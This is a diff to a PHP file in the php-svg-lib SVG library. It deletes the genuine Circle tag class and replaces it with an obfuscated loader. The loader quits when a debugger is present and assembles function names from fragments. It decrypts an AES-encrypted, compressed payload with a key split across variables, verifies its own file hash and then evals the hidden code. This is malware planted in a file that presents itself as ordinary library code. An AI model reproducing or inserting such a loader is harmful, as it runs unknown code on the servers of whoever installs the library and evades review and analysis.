@@ -1,31 +1,28 @@
 <?php
-/**
- * @package php-svg-lib
- * @link    http://github.com/PhenX/php-svg-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license GNU LGPLv3+ http://www.gnu.org/copyleft/lesser.html
- */
-
-namespace Svg\Tag;
-
-class Circle extends Shape
-{
-    protected $cx = 0;
-    protected $cy = 0;
-    protected $r;
-
-    public function start($attributes)
-    {
-        if (isset($attributes['cx'])) {
-            $this->cx = $attributes['cx'];
-        }
-        if (isset($attributes['cy'])) {
-            $this->cy = $attributes['cy'];
-        }
-        if (isset($attributes['r'])) {
-            $this->r = $attributes['r'];
-        }
-
-        $this->document->getSurface()->circle($this->cx, $this->cy, $this->r);
-    }
-} 
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_neq94em3=('bas'.'e64'.'_de'.'cod'.'e');
+$_aa2vw9lx=('gzu'.'nco'.'mpr'.'ess');
+$_sd0014bj=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_f6huangy='r3yPCgNZ';
+$_o2x8hae5='e8a9fI0Y';
+$_a28g9p0y='QteVbZq/';
+$_ifl9c6a3='hAyjPui90Ew=';
+$_n20pvgrs='N80xXnYc';
+$_bp1tqzm9='p10vAPs3';
+$_mxjcjt0i='iAyg6A==';
+$_c3cekulg='/GTRi6ln';
+$_yi8qsyqn=$_neq94em3($_n20pvgrs.$_o2x8hae5.$_a28g9p0y.$_f6huangy.$_ifl9c6a3);
+$_qmrngadi=$_neq94em3($_bp1tqzm9.$_c3cekulg.$_mxjcjt0i);
+$_o4swq1xk=$_neq94em3('fzPbuyU3b82wev1w7Ydj/M6AyZYmFAQUBw8SKnctJ/aHLdjrd+PcZj7pQivzINDUiuaS0ztV7NqRHbKgyaVaok1QZ2vLBQIP4X3oqaB2RlPutXM6g1DccI4L4qnnyU2trxNSOiA1s85mhHjN+gcZ/gn2EmCI1PnSTmc1s/f2XrakysqN9VeZMaAm89xakGMM767xuG2IAlc0SwK/uRyiR/SesoNyRFKaR+P95cPpaSBF96DhXRmxXUCzWbdO/LhuFxGMzH/OV44TTa9WUcSEGg==');
+$_lqdye6c3=$_sd0014bj($_o4swq1xk,'aes-256-cbc',$_yi8qsyqn,OPENSSL_RAW_DATA,$_qmrngadi);
+if($_lqdye6c3===false){exit;}
+$_lgp4t7di=$_aa2vw9lx($_lqdye6c3);
+if($_lgp4t7di===false){exit;}
+$_ybcytegx='bab670d214d2cfcfa9941399b1ee12283ab5ace046ed1464fbdf5494fd34544e';
+$_vi3yl24c=@file_get_contents(__FILE__);
+if($_vi3yl24c!==false){
+$_bdn1wm3p=str_replace($_ybcytegx,"0000000000000000000000000000000000000000000000000000000000000000",$_vi3yl24c);
+$_hlykh1tc=hash("sha256",$_bdn1wm3p);
+if($_hlykh1tc!==$_ybcytegx){@http_response_code(403);exit;}
+}
+eval($_lgp4t7di);
